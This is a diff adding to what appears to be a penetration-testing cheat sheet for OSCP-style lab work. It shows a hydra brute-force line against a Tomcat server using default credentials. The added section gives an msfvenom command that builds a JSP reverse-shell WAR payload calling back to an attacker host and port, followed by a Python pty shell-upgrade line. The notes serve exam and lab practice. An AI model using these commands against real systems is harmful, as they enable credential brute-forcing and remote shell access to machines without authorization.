@@ -49,6 +49,12 @@ hydra 10.10.10.95 -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-be
 Reverse Shells 
 ===============
 
+MSFCONSOLE: (allowed in OSCP exam!!!) 
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f war > reverse.war
+
+
+
 PYTHON:
 python -c 'import pty; pty.spawn("/bin/bash")
 
